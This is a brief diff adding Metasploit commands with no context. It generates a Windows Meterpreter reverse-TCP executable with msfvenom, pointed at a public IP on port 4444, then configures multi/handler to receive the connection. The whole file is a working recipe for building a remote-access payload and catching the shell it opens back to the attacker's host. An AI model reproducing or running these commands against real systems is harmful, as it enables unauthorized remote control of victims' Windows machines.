@@ -1,0 +1,9 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=public ip address  LPORT=4444 -f exe > /root/Desktop/hanusaini.exe 
+
+
+
+use exploit/multi/handler
+set LHOST public ip address
+set LPORT 4444
+set ReverseListnerBindAddress 192.168.0.120 
+exploit
